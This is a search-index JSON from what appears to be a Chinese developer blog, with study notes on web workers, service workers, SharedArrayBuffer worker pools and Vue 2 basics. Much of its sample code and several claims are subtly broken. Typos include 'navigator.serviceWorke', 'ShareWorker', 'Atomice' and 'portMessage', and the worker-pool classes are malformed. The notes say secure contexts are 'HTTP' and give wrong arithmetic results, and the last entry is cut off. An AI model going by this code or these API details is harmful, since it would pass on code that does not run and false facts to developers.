[
  
  {
    "title": "服务工作者线程",
    "url": "/posts/%E6%9C%8D%E5%8A%A1%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-30 00:00:00 +0800",
    





    
    "snippet": "​\t服务工作者线程拦截外出请求、缓存响应，可以让页面在没有网络时正常使用，因为部分或全部页面从服务工作者线程中提供服务。来自一个域的多个页面共享一个服务工作者线程，相关页面关闭后线程也不会关闭，而是等待到来的推送事件。​\t主要任务：充当网络请求的缓存层 &amp; 启用推送通知线程基础​\t没有全局构造函数，通过 ServiceWorkerContainer管理，它的实例保存在navigato...",
    "content": "​\t服务工作者线程拦截外出请求、缓存响应，可以让页面在没有网络时正常使用，因为部分或全部页面从服务工作者线程中提供服务。来自一个域的多个页面共享一个服务工作者线程，相关页面关闭后线程也不会关闭，而是等待到来的推送事件。​\t主要任务：充当网络请求的缓存层 &amp; 启用推送通知线程基础​\t没有全局构造函数，通过 ServiceWorkerContainer管理，它的实例保存在navigator.serviceWorker属性中。if('serviceWorker' in navigator){    window.addEventListener('load', ()=&gt;{        // 创建服务工作者线程        navigator.serviceWorke.register('./serviceWorker.js')\t\t\t.then(console.log, console.error)        \t// 多次调用 同一个URL多次调用该方法返回相同的注册对象        \t .then((registrationA) =&gt; {            \tnavigator.serviceWorke.register('./serviceWorker.js')            \t\t.then((registrationB) =&gt; {                    \tconsole.log(registrationA === registrationB)                })        });    })}​\t.register() 返回一个期约，解决为ServiceWorkerRegistration对象，或在注册失败时拒绝。第一次调用并激活服务站工作者线程后，后续的调用（同一个源）不会执行。由于服务者线程不是所有浏览器都支持、对于页面不可视，所以注册行为常常需要配合 特性检测，并在load事件中操作。ServiceWorkerContainer🎈 事件处理：  oncontrollerchange：获的新激活的ServiceWorkerRegistration线程注册器 触发  onerror：触发ErrorEvent错误事件时  onmessage：触发MessageEvent错误事件时🎈 属性：  ready：返回期约，解决为ServiceWorkerRegistration对象，不会拒绝  controller：返回与当前页面关联的激活的 ServiceWorker对象，如果没有激活的线程则返回null🎈 方法：  getRegistration(URL)：返回的匹配的ServiceWorkerContainer对象，没有则返回null  getRegistrations()：返回匹配的ServiceWorkerContainer对象数组，没有则返回空数组ServiceWorkerRegistration​\tServiceWorkerRegistration对象表示注册成功的服务工作者线程，可以在register()返回的解决期约处理程序中访问到。🎈 事件处理：  onupdatefound：线程开始安装新版本时触发，ServiceWorkerRegistration.installing收到新的服务工作者线程🎈 属性：  scope：获取注册的URL  navigationPreload：返回与注册对象关联的NavigationPreloadManager实例  pushManager：返回与注册对象关联的PreloadManager实例  判断生命周期阶段：（一次快照，除非skipWaiting()强制改变状态）          installing      waiting      active      🎈 方法：  getNotifications()  showNotifications('title',{options})  update()：重写请求服务脚本，URL不同会重新初始化  unregister()：取消服务工作者线程的注册，会在线程执行完成再取消注册ServiceWorker🎈 事件处理：  onstatechange🎈 属性：  scriptURL：解析注册服务工作者的URL，解析为绝对地址  state：可以有以下状态 ——          installing  installed      activating   activated      redundant      安全限制​\t受加载脚本对应源的常规限制；此外几乎可以任意修改和重定向网络请求、加载静态资源。​\tAPI 只能在 安全上下文（HTTP）下使用，非安全上下文中navigator.serviceWorker = undefined​\t可以通过window.issecureContext判断当前上下文是否安全ServiceWorkerGlobalScope🎈 属性：  caches：返回线程的Cachestorage对象  clients：返回线程的clients接口，可以访问底层Client对象  registration：返回线程的ServiceWorkerRegistration对象🎈 方法：  skipWaiting()：强制服务工作者线程进入活动状态，需要和Clients.claim()一起使用  fetch()：在服务工作者线程内发生常规网络请求          可以截获主页面的fetch()请求，在必要时发生实际请求（而不是读取缓存）      self.onfetch属性可以访问FetchEvent，根据需要调整输出        notificationclick：浏览器元素点击ServiceWorkerRegistration.showNotification()触发  notificationclose：浏览器元素关闭ServiceWorkerRegistration.showNotification()触发  pushsubscriptionchange：在应用控制外的因素（非JavaScript显式操作）导致推送订阅状态变化作用域限制​\t只能拦截其作用域内的客户端发生的请求，相对于获取服务脚本的路径定义的// 默认根作用域navigator.serviceWorke.register('./serviceWorker.js')\t// scope: https://example.com/ \t// \t—— https://example.com/foo.js 会被拦截\t// \t—— https://example.com/foo/fooscript.js 会被拦截// 根目录获取脚本，限定目录作用域navigator.serviceWorke.register('./serviceWorker.js', {scope:'./foo'})\t// scope: https://example.com/foo/ \t// \t—— https://example.com/foo.js 不会被拦截\t// \t—— https://example.com/foo/fooscript.js 会被拦截// 嵌套的二级目录获取脚本，指定同一目录作用域navigator.serviceWorke.register('./foo/serviceWorker.js')\t// scope: https://example.com/foo/ \t// \t—— https://example.com/foo.js 不会被拦截\t// \t—— https://example.com/foo/fooscript.js 会被拦截// 作用域范围 ≤ 脚本所在路径navigator.serviceWorke.register('./serviceWorker.js',{scope: '/'}) // Error​\t作用域会使用末尾带斜杠的 绝对路径，将脚本文件的相对路径与其分开，同时将路径本身排除在作用域外。​\t扩展作用域方法：  包含想要的作用域路径提供（获取）服务脚本  服务脚本响应头`Service-Worker-Allowed = `目标作用域，这个作用域应该和register()作用域一致。"
  },
  
  {
    "title": "共享工作者线程",
    "url": "/posts/%E5%85%B1%E4%BA%AB%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-29 00:00:00 +0800",
    





    
    "snippet": "共享工作者线程​\tShareWorker被多个可信任的执行上下文访问，消息接口外部和内部接口与Worker有些不同。可以减少共享线程计算性消耗的情形，一个ShareWorker可以管理多个同源页面web Socket消息，或成为上下文之间的通信线程。🎈\t在行内脚本中创建的共享工作者线程始终是唯一的：只有标识不存在时，才会创建新线程；否则静默新建失败，且调用connect与已有线程建立连接。​...",
    "content": "共享工作者线程​\tShareWorker被多个可信任的执行上下文访问，消息接口外部和内部接口与Worker有些不同。可以减少共享线程计算性消耗的情形，一个ShareWorker可以管理多个同源页面web Socket消息，或成为上下文之间的通信线程。🎈\t在行内脚本中创建的共享工作者线程始终是唯一的：只有标识不存在时，才会创建新线程；否则静默新建失败，且调用connect与已有线程建立连接。​\t共享工作者线程的标识：解析后的URL、工作者线程名称、文档源new ShareWorker('./worker.js',{name:'foo'})new ShareWorker('https://www.example.com/worker.js',{name:'foo'})🎈\tShareWorker.port：特殊属性，专门用来与共享线程通信的Message🎈\tShareWorker.cennect： 事件​\tworker.port.onmessage &amp; worker.port.start() 与共享线程建立连接时触发；​\t包括MessagePort实例的port数组，可以用于把消息发回父上下文🎈\t共享工作者线程的生命周期： 只要还有一个上下文连接就会持续存在。​\t当线程连接数为0时（关联的所有页面被销毁且没有连接），线程被终止；没有办法以编程的方式终止它 —— 不存在 ShareWorker.teminate()​\t共享线程端口上调用close()时，只要还有一个端口连接，就不会真正终止线程。连接到共享工作者线程​\t每次调用ShareWorker.construct时，无论是否创建新线程，都会触发cennect事件，隐式创建MessageChannel实例并将所有权给ShareWorker实例，这个MessageChannel实例保存在connect事件对象的ports数组中。​\t没有任何事件可以断开与ShareWorker实例的连接。随着页面加入和退出连接，connectPorts集合会受到死端口的影响。一个方法是在页面注销前beforeunlode事情时，明确发送卸载消息，让共享线程有机会清除死端口。"
  },
  
  {
    "title": "专用工作者线程",
    "url": "/posts/%E4%B8%93%E7%94%A8%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "专用工作者线程​\t用以执行页面主线程之外的其他任务，如发生网络请求、执行文件输入/输出、密集的计算、处理大量的数据，通过与父页面交换消息，完成不适合在主线程执行的任务。（不能直接操作页面DOM元素）又被称为 后台脚本（background script），由初始化线程时提供的脚本控制线程的各个方面，包括生命周期、代码路径、输入输出。// main.jslocation.href; // \"h...",
    "content": "专用工作者线程​\t用以执行页面主线程之外的其他任务，如发生网络请求、执行文件输入/输出、密集的计算、处理大量的数据，通过与父页面交换消息，完成不适合在主线程执行的任务。（不能直接操作页面DOM元素）又被称为 后台脚本（background script），由初始化线程时提供的脚本控制线程的各个方面，包括生命周期、代码路径、输入输出。// main.jslocation.href; // \"https://...com/\"const worker = new Worker(location.href + 'backgroudScript.js');  // worker是工作者线程与主线程通信的连接点​\tnew Worker() 参数必须是一个脚本文件，专用工作者线程只能被生成它的脚本所使用。​\t初始化工作者线程是需要时间的（初始化延迟），且完全独立于main.js； 相对应的worker线程可能还不存在，但在main.js中的Worker对象已经可以使用了，返回Worker {}；信息发送给初始化状态的工作者线程，会先加入队列，等线程进入活跃状态，再把消息传入线程的消息队列。​\t工作者线程不受主线程（document）内容的安全策略限制，因为工作者线程于父文档处于不同的上下文中运行；但如果线程加载的脚本带有全局唯一标识符时，就会受到文档内容安全策略的限制。Worker 对象​\tnew Worker('url') 返回的实例，与新创建的工作者线程通信的连接点，用于与父上下文传递信息（portMessage）、捕获工作线程发出的事件（onMessage）在终止工作者线程之前，实例不会被垃圾回收，也不能通过编程方式恢复对之前Work对象的引用。​\tworkers 和主线程间的数据传递通过这样的消息机制进行——双方都使用 postMessage() 方法发送各自的消息，使用 onmessage 事件处理函数来响应消息处理程序。可以通过worker.addEventLister('on + type',handler) 添加监视器处理            程序关键词      触发类型      原因                  onerror      ErrorEvent类型的错误事件      线程抛出错误              onmessage      MessageEvent类型的消息事件      向父级上下文发送消息              onmessageerror      MessageEvent类型的错误事件      无法反序列化的消息      方法​\t🎈postMessage(message, targetOrigin, [transfer])：通过异步消息事件，向工作者线程发生消息​\t\t\t🎱 message，需要传递的信息（可以是对象、数组等）无需自己序列化​\t\t\t🎱 targetOrigin，指定哪些窗口能接收到消息事件，字符串”*“（表示无限制，不建议依赖使用）或者一个 URI​\t\t\t🎱 transfer，是一串和 message 同时传递的 Transferable 对象。这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。​\t\t\t 监听分发的 message： data（传递过来的对象），origin（发送方的origin信息），source（发送方窗口对象的引用） 可以用来检查消息的发送者的身份​\t🎈terminate()：立即终止工作者进程，没有清理机会，脚步突然停止；锁定消息队列。DedicatedWorkerGlobalScope​\t全局作用域是 DedicatedWorkerGlobalScope 的实例，因其继承自WorkerGlobalScope，所以包含其内部所有属性和方法。可以通过 self关键字 访问全局作用域。​\t与父类不同的属性和方法：​\t🎈name：可选，Worker实例的字符串标识符​\t🎈close()： 与主线程上的worker.terminate()对应​\t🎈importScripts()： 引入任意数量的脚本生命周期​\t非正式地分为三个状态：初始化（initializing）、活动（active）、终止（terminated），对于其他上下文是不可见的。​\t创建之后，专用工作者线程伴随着 页面整个生命期而存在。即使线程执行完毕，其环境仍然会存在，与之关联的Worker对象就不会被回收。​\t关闭线程：  close()：:one: 取消事件循环中的所有任务，并阻止继续添加新任务； :two: 不停止已经存在的同步任务。  terminate： 线程的消息队列被清理并锁住，立即停止且没有清理的机会。// 主线程worker.terminate();// Worker 线程self.close();​\t在整生命周期中，专用工作者线程只关联一个页面——只要页面存在，专用线程就会存在；页面离开，与页面关联的工作者线程标志为终止，且执行立即停止。通信​\t异步、消息完成通信postMessage() —— 临时通信MessageChannel() —— 专用通信​\tChannel Messaging API 的 MessageChannel 接口允许我们创建一个新的消息通道，并通过它的两个 MessagePort 属性发送数据。MessageChannel实例有个两个只读属性，MessageChannel.port1 &amp; MessageChannel.port2，就像电话的两端，使用其中一个端口发送信息，另个端口的监视事件就可以接收到数据。需要借助 postMessage()建立的临时链接 分派端口给子工作者线程。  其他妙用：  ​\t管道通信 —— MessageChannel用法总结 - 全玉 - 博客园 (cnblogs.com)  ​\t其他框架使用场景 —— 浅谈MessageChannel - 掘金 (juejin.cn)// main.jsconst { port1, port2 } = new MessageChannel();const workerA = new Worker('./scriptA.js')const workerB = new Worker('./scriptB.js')// 1. 需要把端口发送给工作者线程中，建立两者的链接workerA.postMessage('connect',[port1]);workerB.postMessage('connect',[port2]);// 2. 控制两个工作者线程传递消息workerA.postMessage('sending')workerB.postMessage('sending')// scriptA.jslet port;self.onmessage = (e)=&gt;{    switch (e.data){        case 'connect':            port = e.ports[0]          \tbreak;       \tcase 'listening'            port.onmessage = (event) =&gt; {console.log(`workerA get the msg from workerB`)}            break;        case 'sending':            port.postMessage = ('listening') // port1 只能向 port2 传递消息\t            break;    }}BroadcastChannel() —— 广播通信​\t同源脚本可以通过BroadcastChannael互相发送、接收信息，如广播通信，需要有实体监听信道才能获得处理。且考虑初始化工作者线程延迟，应该使用计时器延后处理。// main.jsconst channel = new BroadcastChannel('worker_channel');const worker = new Worker('./Worker.js');channel.onmessage = ({data}) =&gt; {    console.log(`heard ${data} on page`);}// 延时，等工作者线程初始化完成setTimeout(() =&gt; channel.postMessage('foo'), 1000 );// Worker.jsconst channel = new BroadcastChannel('worker_channel');self.onmessage = ({data}) =&gt; {    console.log(`heard ${data} in worker`);    channel.postMessage('bar'), 1000 );}数据传输​\t不同线程处于不同的上下文中，它们之间的数据传输会尝试销毁。转移信息的方式有三种：结构化克隆算法（ structured clone algorithm）、可移动对象（transferable object）、共享数组缓冲区（shared array buffers）结构化克隆算法​\t在浏览器后台实现，不可以显式调用。通过postMessage()传递对象时，浏览器遍历该对象，并在目标上下文中生成一个副本（深拷贝），支持除了Symbol之外的所有原型类型。​\t注意点：  可以识别对象包含的循环引用，不会无穷遍历对象  克隆error对象、Function对象、DOM节点会抛出错误  并不总数创建完全一直的副本，对象属性描述符、get() set()、原型链、RegExp.prototype.lastIndex属性不会复制可移动对象​\t把所有权从一个上下文转移到另一个上下文，适用于在不太可能大量复制数据的情况下。​\tpostMessage() 的第二个可选参数是数组，指定转移哪些对象。浏览器遍历消息负载时，根据这个数据检查对象引用，移动而不是复制它们。// main.jsconst worker = new Worker('./worker.js')const arrayBuffer = new ArrayBuffer(32); // 主线程申请32位的数组缓冲区// 第一种，常规化克隆算法worker.postMessage(arrayBuffer);arrayBuffer.byteLength; // 32, 主线程依然留有// 第二种，可移动对象worker.postMessage(arrayBuffer, [arrayBuffer]);arrayBuffer.byteLength; // 0// worker.jsself.onmessage = ({data}) =&gt; {    console.log(arrayBuffer.byteLength;); // 32}​\tworker.postMessage({foo:{bar:arrayBuffer}}, [arrayBuffer]); 嵌套在对象内部可移动对象，包装对象被复制、嵌套对象被转移共享数组缓冲区​\tSharedArrayBuffer作为ArrayBuffer能够在不同浏览器上下文间共享，在使用postMessage时只会传递原始缓冲区的引用 —— 多个上下文（并行线程）分别维护同一个内存块，存在资源争用的风险。可以使用Atomics对象，让工作者线程获得SharedArrayBuffer实例的锁：Atomics.add(view, view下标, argument)，在执行完成全部读写操作后，才允许下一个线程执行操作。// main.jsconst workers = [] // 线程池for(let i = 0; i&lt;4; ++i){    workers.push(new Worker('./worker.js'));}let responseCount = 0; // 获取计算结果for(const worker of workers){    worker.onmessage = () =&gt;{\t\tif(++responseCount === workers.lenght){        \tconsole.log(`Final buffer value: ${ view[0] }`)         }    }}const shareArrayBuffer = new SharedArrayBuffer(4); // 初始化`SharedArrayBuffer`const view = new Uint32Array(SharedArrayBuffer);   // 创建`SharedArrayBuffer`视图view[0] = 1;for(const worker of workers){    woker.portMessage(SharedArrayBuffer);}// Final buffer value: 400001// worker.jsself.onmessage = ({data} =&gt; {\tconst view = new Uint32Array(data);    // 执行100万次操作    for(let i = 0; i &lt; 1E6; ++i){\t\t// view[0] += 1;  可能产生脏读        Atomice(view, 0, 1);    }})线程池​\t使用固定数量的线程活动，根据线程状态空闲与否分配任务。线程在执行任务时，会被标记为忙碌状态，直至通知线程池空闲时，才会被安排新的工作。这些活动线程被称为“线程池”。​\tnavigator.hardware Concurrency属性返回 系统可用的核心数量，最好以此作为线程池大小的上限。​\t线程策略：每个线程执行相同的任务，但具体执行什么任务由参数个数控制。线程执行耗时计算后返回结果，线程池在将其他工作分配给线程执行。eg：​\t定义TaskWorker类：跟踪线程是否正忙于工作、管理进出线程的信息和事件。class TaskWorker extends Worker{    constructor(notifyAvailable, ...workerArgs){        super(...workerArges);                this.available = false;        this.resolve = false;        this.reject = false;                this.notifyAvailable = notifyAvailable; // 空闲时，向线程池发送信号，以分配任务        this.onmessage = () =&gt; this.setAvailable(); // 线程完成初始化时，向线程池发送信息    }    dispatch({resoleve, reject, postMessageArgs}){        this.available = false;        this.onmessage = ({data}) =&gt; {            resolve(data);            this.setAvailable();        }        this.onerror //... 调用 reject()、setAvailable()        this.postMessageArgs(...postMessageArgs);    }    setAvailable(){ // 初始化线程，通知线程池        this.available = false;        this.resolve = false;        this.reject = false;        this.notifyAvailable();             }}​\t定义workerPool类，使用TaskWorker类：管理未执行的任务队列，并负责关闭线程class WorkerPool {    constructor(poolSize, ...workerArgs){        this.taskQueue = [];        this.workers = [];        // 初始化线程池        for(let i = 0; i &lt; poolSize; ++i){            this.workers.push(                // 将可分配的线程推入数组            \tnew TaskWorker(() =&gt; this.dispatchIfAvaliable(), ...workerArgs);            )        }        // 初始化任务队列        enqueue(...postMessagee){            return new Promise((resolve, reject) =&gt; {                this.taskQueue.push({resolve, reject});                this.dispatchIfAvaliable();            })        }        // 将任务分配给线程        dispatchIfAvaliable(){            if(!this.taskQueue.lenght) return; // 没有可以用的线程            for(const worker of this.workers){                if(worker.avaliable){                    let a = this.taskQueue.shift();                    worker.dispatch(a);                    break;                }            }        }        // 终止所有工作者线程        close(){            for(const worker of this.workers){                worker.terminate();            }        }    }}​\t使用案例： 计算1000万个浮点数之和// worker.jsself.onmessage = ({data}) =&gt; {    let sum = 0;    let view = new Float32Array(data.arrayButter);        for(let i = data.arrayButter; i&lt;data.endIdx; ++i){        sum += view[1];    }    self.postMessage('ready');}// main.jsconst totalFloats = 1E8; //1000万const numTasks = 20; // 20个任务const floatPerTask = totalFloats / numberTasks; // 每个线程计算数const numWorker = 4; // 4个线程// 创建线程池const pool = new WorkerPool(num, './worker.js');// 填充浮点数let arrayBuffer = new ShareArrayBuffer(4 * totalFloats);let view = new Float32Array(data.arrayButter);for(let i = 0; i &lt; totalFloats; i++){    view[i] = Math.random();}let partialsumPromises = [];for(let i = 0; i&lt; totalFloats; i += floatPerTask){    partialSumPromises.push( // 维护一个promise队列    \tpool.enqueue({ // 添加进线程池任务队列            startIdx: i,            endIdx: i + floatPerTask,            arrayBuffer        })    )}// 等待promise队列全部任务结束Promise.all(partialSumPromises)\t.then(partialSum =&gt; partialSum.reduce((prev,cur) =&gt; prev + cur))\t.then(finalSum =&gt; console.log(finalSum))"
  },
  
  {
    "title": "工作者线程",
    "url": "/posts/%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-20 00:00:00 +0800",
    





    
    "snippet": "工作者线程​\t允许把主线程的工作转移到独立的实体，而不改变现有的单线程模式。浏览器主线程负责与处理用户事件和页面绘制等。​\tJavaScript环境实际是运行在托管操作系统的虚拟环境。每个页面都有自己的环境，内存、事件循环、DOM等等，不会影响到其他页面。所有页面环境都是并行处理的。​\t使用工作者线程，可以在原始页面环境之外，在分配一个完全独立的二级子环境，与主线程不能直接通信只能使用 消息...",
    "content": "工作者线程​\t允许把主线程的工作转移到独立的实体，而不改变现有的单线程模式。浏览器主线程负责与处理用户事件和页面绘制等。​\tJavaScript环境实际是运行在托管操作系统的虚拟环境。每个页面都有自己的环境，内存、事件循环、DOM等等，不会影响到其他页面。所有页面环境都是并行处理的。​\t使用工作者线程，可以在原始页面环境之外，在分配一个完全独立的二级子环境，与主线程不能直接通信只能使用 消息 完成，不能与依赖单线程交互的API（如DOM）互操作，但可以与父环境并行执行。工作者线程相对较重，通常占用较大内存，不建议大量使用；调度之间存在性能损耗，所以应该谨慎使用线程，给常驻的、启动成本高的、计算量较大的工作分配。​\t🎈\t以实际线程实现的，对应着底层的线程。​\t🎈\t环境内的指令是可以并行执行的​\t🎈\t可以共享某些内存，但不完全共享全部内存。可以使用sharedArrayBuffer在多个环境间共享内容 —— 使用Atomics接口实现并发控制，其他数据进出线程需要移动或者复制。​\t🎈\t工作者线程不一定在同一个进程里，共享工作者线程和服务工作者线程就可能使用独立的进程。​\t存在限制：​\t🚫\t工作者线程（顶级工作者线程和子工作者线程）的脚本文件只能从父页面相同的源加载。可以加载、执行其他非同源的脚步（importScript()）。​\t🚫\tWorker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。​\t🚫\tWorker 线程无法读取本地文件，即不能打开本机的文件系统（file://）。​\t🚫 \t无法读取、操作主线程所在网页的 DOM 对象、window对象等​\t子工作者线程，确保并行计算的投入的收益 &gt; 多个子线程计算成本；子工作者线程的脚本路径根据父工作者线程解析。本地文件初始化工作者线程​\t工作者线程需要基于脚本文件创建，但不意味着该脚本必须是远程资源。可以利用Blob对象的URL在行内创建。 可以更快速初始化工作者线程，没有网络延迟。​\tBlob 对象，二进制类型的大文件，是不可变、原始数据的类文本对象；可以以文本、二进制格式读取，或转为readable Stream。  new Blob(array,{option})：          array，可迭代对象，Array、DataView、Blob、字符串或他们的混合，将被放入Blob中      option，指定type（指定数据的MIME类型）和endings（包含结束符/n字符串将如何被写入）两个属性的对象                  MIME（多用途互联网邮件扩展类型 Multipurpose Internal Mail Extensions)，如text/html image/png text/plain text/script          endings:transparent 默认值，保存不变          endings:native 更改为更适合宿主系统的换行符。                      URL.createObjectURL(object) —— URL.revokeObjectURL(objectURL)          传入 File / Blob / Medioa 对象 用以创建 URL      使用URL.createObjectURL(object)创建对象URL，代表对象存在引用，会影响内存垃圾回收，应该在合适时机使用URL.revokeObjectURL(objectURL) 释放URL对象      Web Worker中可以用，在Service Worker中不可以用，可能导致内存泄漏。      // 函数后序列化传入，在父上下文中定义，在子上下文中执行function Fibonacci(n) {    return n&lt;1 ? 0 : n&lt;2 ? 1 : Fibonacci(n-1) + Fibonacci(n-2)}// 字符串const workerString = `\tself.onmessage = ({data}) =&gt; console.log(data);\tself.postMessage((${ Fibonacci.toString() })(9))`const workerBlob = new Blob([workerString],{type: 'text/javascript'})const workerBlobURL = URL.createObjectURL(workerBlob);const worker = new Worker(workerBlobURL)worker.onmessage = ({data}) =&gt; console.log(data) // 34 接收worker回传数据worker.postMessage('hi,just say something?'); // hi,just say something? 向worker发生数据// 缩写：const worker = new Worker(URL.createObjectURL(new Blob([workerString])));在工作者线程中动态执行脚本​\t使用importScripts() 方法编程方式，不一定按顺序加载、按顺序同步执行任意脚本，可以接收任意数量的参数  无论是什么类型文件，都会当成JavaScript解析，所以需要是有效的 JavaScript MIME 类型，如text/javascript  在工作者线程内部可以请求任何来源的脚本（没有CORS限制）  加载成功后，每个脚本中的全局上下文都能够在 Worker 线程中使用 —— 共享作用域  如果脚本无法加载，将会抛出错误，并且之后的代码也无法执行了// main.jsconst worker = new Worker('./worker.js',{name:'foo'});// worker.jsimportScripts('./scriptA.js','./scriptB.js');const workerToken = 'worker.js'console.log(`in worker.js,, name is ${ self.name }, workerToken is ${ workerToken }`)// scriptA.jsconsole.log(`in scriptA.js, name is ${ self.name }, workerToken is ${ workerToken }`)// scriptB.jsconsole.log(`in scriptB.js, name is ${ self.name }, workerToken is ${ workerToken }`)处理工作者线程错误​\t抛出错误的工作者线程，可以不打断父线程的执行。try/catch不能捕获到错误，不过依然会冒泡到工作者线程的全局上下文，因此可以在Worker对象上设置 错误事件监听器 才可以访问到。// main.js const worker = new Worker('./woker.js')worker.onerror = console.log; // isTrusted: true, message: 'Uncaught Error: errormessage',....// woker.jsthrow Error('errormessage')"
  },
  
  {
    "title": "Vue生命周期",
    "url": "/posts/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-30 00:00:00 +0800",
    





    
    "snippet": "Vue生命周期  created:html加载完成之前，执行。执行顺序:父组件-子组件  mounted:html加载完成后执行。执行顺序:子组件-父组件  methods:事件方法执行          可用this调用其他方法        watch:去监听一个值的变化，然后执行相对应的函数  computed:computed是计算属性，也就是依赖其它的属性计算所得出最后的值销毁 &...",
    "content": "Vue生命周期  created:html加载完成之前，执行。执行顺序:父组件-子组件  mounted:html加载完成后执行。执行顺序:子组件-父组件  methods:事件方法执行          可用this调用其他方法        watch:去监听一个值的变化，然后执行相对应的函数  computed:computed是计算属性，也就是依赖其它的属性计算所得出最后的值销毁 &amp; 事件​\t当调用this.$destroyed后，原生的事件回调仍然可以被触发，如@cilck()等；​\t子组件以及组件自定义的事件 &amp; 页面响应式变化就会被销毁而无法触发"
  },
  
  {
    "title": "虚拟DOM",
    "url": "/posts/%E8%99%9A%E6%8B%9FDOM/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-26 00:00:00 +0800",
    





    
    "snippet": "​\t什么是真实DOM？在Vue2中引入“虚拟DOM”，指不立即操作DOM，而是将更新的diff内容保存到本地的 JS 对象中，对比原来DOM树有什么区别，实现局部更新，最终一次性attch到DOM树上，避免了大量的无谓计算量虚拟DOM：一个能代表DOM树的对象，通常含有标签名、标签属性、事件监听和子元素们，以及其他属性  优点：页面更新可以先全部反映到虚拟DOM上，内存操作的JS对象处理速度...",
    "content": "​\t什么是真实DOM？在Vue2中引入“虚拟DOM”，指不立即操作DOM，而是将更新的diff内容保存到本地的 JS 对象中，对比原来DOM树有什么区别，实现局部更新，最终一次性attch到DOM树上，避免了大量的无谓计算量虚拟DOM：一个能代表DOM树的对象，通常含有标签名、标签属性、事件监听和子元素们，以及其他属性  优点：页面更新可以先全部反映到虚拟DOM上，内存操作的JS对象处理速度会更快，最终再交由浏览器绘制          减少DOM操作：减少次数、局部更新      跨平台，本质是一个js对象        缺点：需要额外的创建函数，如vue的h，使用v-loader转译，严重依赖打包工具，花费重新构建的过程DOM diff什么是diff：​\t一种比较算法，通过js层面的计算，根据两个虚拟对象创建出差异的补丁对象patch，用以描述改变内容，然后用特定的操作解析patch对象，更新DOM页面重新渲染  patches = patch(oldVNode,newVNode) ## 大致逻辑  Tree diff:          新旧两棵树逐层对比，记录需更新的节点      节点是组件 — 看Component diff      节点是标签 — 看Element diff        Component diff          组件类型                  不同直接替换（删除旧的）          类型相同只做更新                    深入组件做Tree diff（递归）        Element diff          原生标签，看标签名                  标签名不同直接替换          标签名相同则只更新属性                    深入标签后代做Tree diff（递归）      缺点​\t同级节点对比存在bug —— 节点添加唯一的id使用diff.patch()实现Vue虚拟DOM转化为真实DOM渲染  初始化function createElement(vnode){    let tag = vnode.tag // 目标元素    let attrs = vnode.attrs || {} //属性，无则为空对象    let children = vnode.children || [] // 子节点    if(!tag) {return null;} //若目标节点不存在，退出函数    // 创建对应的DOM    let elem = document.createElement(tag);    // 添加属性    let attrName; // 属性名    for(attrName in attrs){         if(attrs.hasOwnProperty(attrName)){             elem.setAttribute(attrName,attrs[attrName]) // 将属性添加到元素的属性数组中         }    }    // 添加子节点    children.forEach(function(childVnode){        elem.appendChild(createElement(childVnode))    });    return elem;}  更新function updateChildren(oldVnode,newVnode){    let oldChildren = oldVnode.children() || [];    let newChildren = newVnode.children() || [];    oldChildren.forEach(function(oldchildrenVnode,index){        let newChildrenVnode = newChildren[index];        // 子节点 没有变化，递归查找下一层子节点        if(oldchildrenVnode === newChildrenVnode){            updateChildren(oldchildrenVnode,newChildrenVnode)        }else{ // 子节点 tag不一样，直接替换            replaceNode(oldchildrenVnode,newChildrenVnode)        }    })}"
  },
  
  {
    "title": "绑定style",
    "url": "/posts/%E7%BB%91%E5%AE%9Astyle/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-22 00:00:00 +0800",
    





    
    "snippet": "  Class样式  —— :class=\"xxx\"          字符串写法：类目不确定，动态获取      对象写法：个数不确定，名字也不确定      数组写法：名字已经确定，个数确定，但不确定用不用        Style样式  —— 属性键值对，需要驼峰命名法          :style = \"{fontSize: 'xxx'}\"      :style = \"[a,b]...",
    "content": "  Class样式  —— :class=\"xxx\"          字符串写法：类目不确定，动态获取      对象写法：个数不确定，名字也不确定      数组写法：名字已经确定，个数确定，但不确定用不用        Style样式  —— 属性键值对，需要驼峰命名法          :style = \"{fontSize: 'xxx'}\"      :style = \"[a,b]\"      &lt;div id=\"root\"&gt;    &lt;!-- &lt;div class=\"base\" @click=\"changeClass\" id=\"demo\"&gt;test&lt;/div&gt; --&gt;    &lt;!-- 【字符串写法】插入一个class，动态实现class --&gt;    &lt;div class=\"base\" :class=\"a\" @click=\"changeClass\"&gt;test&lt;/div&gt;    &lt;!-- 【数组写法】插入一个系列class，样式个数不确定、名字不确定 --&gt;    &lt;div class=\"base\" :class=\"arr\"&gt;test&lt;/div&gt;    &lt;!--  :class=\"['radius1','radius2']\"  双引号里面可以放 表达式 --&gt;    &lt;!--  :class=\"[radius1,radius2]\"  去掉数组元素里面的引号，vue当成变量名使用，需要data里面有相应的值 --&gt;    &lt;!-- 【对象写法】样式个数确定、名字确定，但是动态决定用不用--&gt;    &lt;div class=\"base\" :class=\"obj\"&gt;test&lt;/div&gt;    &lt;!--  :class=\"{radius1: true,radius2: false}\"    --&gt;    &lt;!-- 【行内式】 1.样式为键值对，需要使用对象  2.font-size 改为fontSize， --&gt;    &lt;!-- 数值写法：style='stylyArr'  style='[styleObj1,stleObj2]'--&gt;    &lt;div class=\"base\" :style=\"{fontSize:fsize+'px'}\" &gt;test&lt;/div&gt;    &lt;div class=\"base\" :style=\"stylyObj\" &gt;test&lt;/div&gt;&lt;/div&gt;new Vue({    el:\"#root\",    data:{        a:'bcc1',        arr:['radius1','radius2'],        obj:{            radius1: false,            radius2: false        },        fsize:59,        stylyObj:{            fontSize:'60px',            backgroundColor:'#984'        }    }})"
  },
  
  {
    "title": "组件实例",
